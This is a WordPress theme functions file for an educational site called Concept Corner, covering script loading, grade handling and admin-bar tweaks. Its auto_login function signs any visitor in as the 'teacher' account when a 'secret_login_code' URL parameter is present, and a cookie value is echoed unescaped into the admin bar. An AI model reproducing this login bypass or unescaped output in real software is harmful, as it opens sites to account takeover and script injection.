<?php
/**
 * Concept Corner main theme
 *
 */

define( 'CCVER', '4.98' );

global $cc, $cc_content, $cc_grades, $cc_current_grade, $cc_all_grades, $cc_track;

include( 'includes/shortcodes.php' );

add_action( 'after_setup_theme', 'cc_setup_theme' );

//add_action( 'init', 'cc_prevent_wp_login' );
add_action( 'admin_init', 'cc_redirect_non_admin_users' );

add_action( 'wp_before_admin_bar_render', 'cc_admin_bar' );
add_action( 'admin_bar_menu', 'cc_add_edit_links_to_menu', 999 );

//add_action( 'template_redirect', 'force_login' );
add_action( 'template_redirect', 'cc_template_prep' );

add_action( 'wp_enqueue_scripts', 'cc_register_theme_scripts' );

add_filter( 'image_size_names_choose', 'cc_image_chooser' );
add_filter( 'gettext', 'dey_remove_lostpassword_text' );
add_filter( 'show_admin_bar', 'cc_hide_admin_bar' );
add_filter( 'wp_calculate_image_srcset', 'disable_srcset' );

// theme setup
function cc_setup_theme() {
	
	global $cc, $cc_grades, $cc_all_grades, $cc_track;
	
	// load the concept corner class object
	$cc = Concept_Corner::get_instance();
	
	// this returns an array, ordered by grade order via slug, indexed by grade id
	// all grades is all top-level grades to allow for "greyed out" grades in menus and the home page
	$cc_grades = $cc->get_cc_grades();
	$cc_all_grades = $cc->get_cc_grades( true );
	
	// set the track via cookie
	$cc_track = null;
	
	if ( ( isset( $_COOKIE['track'] ) && $_COOKIE['track'] !== null ) || ( isset( $_GET['track'] ) ) ) {
	
		if ( isset( $_GET['track'] ) ) {
			if ( $_GET['track'] == 'remove' ) {
				setcookie( "track" );
			} else {
				setcookie( "track", $_GET['track'], 0, '/' );
				$cc_track = $_GET['track'];
			}
		} else {
			$cc_track = htmlspecialchars( $_COOKIE['track'] );
		}
	}

	remove_shortcode( 'row' );

	// content width
	global $content_width;
	if ( ! isset( $content_width ) ) $content_width = 614;

	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'title-tag' );

	register_nav_menus( array(
		'footer_nav' => 'Footer Navigation',
	) );

	register_sidebar( array(
		'name' => 'Page Sidebar',
		'id' => 'sidebar-1',
		'description' => 'Sidebar used in some templates',
		'class' => '',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget'  => '</li>',
		'before_title'  => '<h3 class="widgetTitle">',
		'after_title'   => '</h3>',
	));

	// Clean up features we don't need
	remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head' );
	remove_action( 'wp_head', 'rsd_link' );
	remove_action( 'wp_head', 'wlwmanifest_link' );
	remove_action( 'wp_head', 'wp_generator' );
	remove_action( 'wp_head', 'feed_links_extra', 3 );
	remove_action( 'wp_head', 'feed_links', 2 );
}

function cc_admin_bar() {
	/**
	 * @var WP_Admin_Bar $wp_admin_bar
	 */
	global $wp_admin_bar;
	$wp_admin_bar->remove_menu( 'comments' );
}

// only allow original images to be inserted
function cc_image_chooser() {
	return array(
		'full' => __( 'Automatically Sized' ),
	);
}

// load our filtered content based on the query var
function cc_template_prep() {
	
	global $cc, $cc_content, $cc_grades, $cc_current_grade;

	$cc_explore_path = get_query_var( 'cc_explore' );
	$cc_content      = $cc->content( $cc_explore_path );

	// determine the current grade
	$cc_current_grade = array();

	if ( isset( $cc_content['filters']['grade'] ) && $cc_content['filters']['grade'] ) {
		// set the id equal to this
		$cc_current_grade['id']   = $cc_content['filters']['grade'];
		$cc_current_grade['name'] = $cc_grades[ $cc_content['filters']['grade'] ]['name'];
	}
}

// enqueue common library items using function in mu-plugins/load
function cc_scripts_library() {

	global $cc_current_grade;

	cc_script_enqueue( 'bootstrap' );
	cc_script_enqueue( 'fancybox' );

	// following only on +2 grades
	if ( isset( $cc_current_grade['name'] ) && (int) $cc_current_grade['name'] > 1 ) {
		cc_script_enqueue( 'mathjax' );
	}
}

// enqueue non-common items
function cc_register_theme_scripts() {

	global $cc_content, $cc_current_grade;

	cc_scripts_register();

	cc_scripts_library();
	
	wp_register_script( 'cc-js-visible', CC_LOCATION . '/js/jquery.visible.min.js', array( 'jquery' ), CCVER, true );
	wp_register_script( 'cc-js-main', CC_LOCATION . '/js/main.js', array( 'jquery', 'bootstrap', 'cc-js-visible' ), CCVER, true );
	wp_register_script( 'cc-js-k', CC_LOCATION . '/js/k.js', array( 'jquery', 'bootstrap', 'cc-js-visible' ), CCVER, true );
	wp_register_script( 'cc-js-modernizr', CC_LOCATION . '/js/modernizr.custom.js', array( 'jquery' ), CCVER, false );
	
	wp_register_script( 'cc-js-crawl', CC_LOCATION . '/js/crawl.js', array( 'jquery' ), CCVER, false );

	wp_register_style( 'cc-2-12', CC_LOCATION . '/css/style-2-12.css', array(), CCVER, 'all' );
	wp_register_style( 'cc-k-1', CC_LOCATION . '/css/style-k-1.css', array(), CCVER, 'all' );
	wp_register_style( 'cc-k-1-front', CC_LOCATION . '/css/splitpage.css', array(), CCVER, 'all' );
	wp_register_style( 'cc-fonts', CC_LOCATION . '/css/fonts.css', array(), CCVER, 'all' );
	wp_register_style( 'cc-font-awesome-fonts', CC_LOCATION . '/css/font-awesome.min.css', array(), CCVER, 'all' );

	// everyone needs this, apparently
	wp_enqueue_script( 'cc-js-modernizr' );
//	wp_enqueue_script( 'cc-js-crawl' );

	if ( isset( $cc_current_grade['name'] ) && (int) $cc_current_grade['name'] < 2 ) {

		// k-1 only scripts/styles
		wp_enqueue_style( 'cc-fonts' );
		wp_enqueue_script( 'cc-js-k' );

		// we could either example the URL or do this, see if the filters are set for deeper content
		if ( $cc_content['filters']['special'] === 'k1' ) {
			wp_enqueue_style( 'cc-k-1-front' );
		} else {
			wp_enqueue_style( 'cc-k-1' );
		}

	} else {

		// "normal" styles
		wp_enqueue_script( 'cc-js-main' );
		wp_enqueue_style( 'cc-fonts' );
		wp_enqueue_style( 'cc-2-12' );
		wp_enqueue_style( 'cc-font-awesome-fonts' );

	}
}

/**
 * Force users to login
 */
function force_login() {
	if ( ( ! is_user_logged_in() ) && ( ! is_page( 'login' ) ) ) {
		$url = parse_url( home_url( $_SERVER['REQUEST_URI'] ) );
		$re  = $url['path'];
		wp_redirect( home_url( '/login/?redirect=' . $re ) );
		exit();
	}
}

/**
 * Remove lost password text
 *
 * @param $text
 *
 * @return string
 */
function dey_remove_lostpassword_text( $text ) {
	if ( $text == 'Lost your password?' ) $text = '';
	return $text;
}

/**
 * Hide admin bar from non-editors
 *
 * @return bool
 */
function cc_hide_admin_bar() {
	if ( ! current_user_can( 'delete_others_pages' ) ) return false;
	return true;
}

/**
 * Hide admin from non-editors
 */
function cc_redirect_non_admin_users() {
	if ( ! current_user_can( 'delete_others_pages' ) && ! defined( 'DOING_AJAX' ) ) {
		wp_redirect( home_url() );
		exit;
	}
}

/**
 * Prevent wp-login.php, in theory
 */
function cc_prevent_wp_login() {

	global $pagenow;
	$action = ( isset( $_GET ) ) ? $_GET : array();

	if ( $pagenow == 'wp-login.php' && ! in_array( $action, array( 'logout', 'lostpassword', 'rp' ) ) && empty( $_POST ) ) {
		wp_redirect( home_url( '/login/' ) );
	}
}

/**
 * Add items to WP admin bar
 *
 * @param WP_Admin_Bar $wp_admin_bar
 */
function cc_add_edit_links_to_menu( $wp_admin_bar ) {
	
	global $cc_content;

	if ( current_user_can( 'edit_others_posts' ) && ! is_admin() ) {

		if ( isset( $cc_content['current']['unit']['ID'] ) && $cc_content['current']['unit']['ID'] ) {

			$args = array(
				'id'    => 'cc_edit_unit',
				'title' => 'Edit Unit',
				'href'  => '/wp/wp-admin/post.php?post=' . $cc_content['current']['unit']['ID'] . '&amp;action=edit',
				'meta'  => array( 'class' => 'cc-toolbar-page' )
			);
			$wp_admin_bar->add_node( $args );
		}

		if ( isset( $cc_content['current']['concept']['ID'] ) && $cc_content['current']['concept']['ID'] ) {

			$args = array(
				'id'    => 'cc_edit_concept',
				'title' => 'Edit Concept',
				'href'  => '/wp/wp-admin/post.php?post=' . $cc_content['current']['concept']['ID'] . '&amp;action=edit',
				'meta'  => array( 'class' => 'cc-toolbar-page' )
			);
			$wp_admin_bar->add_node( $args );
		}

		if ( isset( $cc_content['current']['explanation']['ID'] ) && $cc_content['current']['explanation']['ID'] ) {

			$args = array(
				'id'    => 'cc_edit_exp',
				'title' => 'Edit Explanation',
				'href'  => '/wp/wp-admin/post.php?post=' . $cc_content['current']['explanation']['ID'] . '&amp;action=edit',
				'meta'  => array( 'class' => 'cc-toolbar-page' )
			);
			$wp_admin_bar->add_node( $args );
		}

		// add track flag

		if ( isset( $_COOKIE['track'] ) && $_COOKIE['track'] ) {

			$args = array(
				'id'    => 'cc_track',
				'title' => 'Track: ' . $_COOKIE['track'],
				'href'  => '/wp/wp-admin/',
				'meta'  => array( 'class' => 'cc-toolbar-page' )
			);
			$wp_admin_bar->add_node( $args );
		}

	}
}

/**
 * Disable srcset
 *
 * @return bool
 */
function disable_srcset() {
	return false;
}
remove_action( 'wp_head', '_wp_render_title_tag', 1 );

add_filter( 'wp_title', 'baw_hack_wp_title_for_home' );
function baw_hack_wp_title_for_home( $title )
{
	global $cc_content;
	if( isset($cc_content['units'][ $cc_content['filters']['unit'] ]['display_title']) ){
		$title = $cc_content['units'][ $cc_content['filters']['unit'] ]['display_title'];
	}else{
		$title = get_the_title();
	}
	if( isset($cc_content['current']['concept']['display_title']) ){
		$title = $cc_content['current']['concept']['display_title'];
	}
	if( isset($cc_content['current']['explanation']['display_title']) ){
		$title = $cc_content['current']['explanation']['display_title'];
	}
		

		
    return $title. ' | '.get_bloginfo('name');
}

function wpb_mce_buttons_2($buttons) {
	array_unshift($buttons, 'styleselect');
	return $buttons;
}
add_filter('mce_buttons_2', 'wpb_mce_buttons_2');

/*
* Callback function to filter the MCE settings
*/

function my_mce_before_init_insert_formats( $init_array ) {  
	$style_formats = array(  
		array(  
			'title' => 'Transcript Content',  
			'block' => 'div',  
			'classes' => 'hidden transcript',
			'wrapper' => true,
			
		)
	);  

	$init_array['style_formats'] = json_encode( $style_formats );  
	
	return $init_array;  
  
} 

add_filter( 'tiny_mce_before_init', 'my_mce_before_init_insert_formats' );

function auto_login() {
  //change these 2 items
  $login_get = 'secret_login_code'; //Page ID of your login page
  $login = 'teacher';
  if (!is_user_logged_in() && !empty($_GET[$login_get])) {
    //get user's ID
    $user = get_user_by('login', $login);
    $user_id = $user->ID;
    //login
    wp_set_current_user($user_id, $login);
    wp_set_auth_cookie($user_id);
    do_action('wp_login', $login);
  }
}
add_action('init', 'auto_login', 1);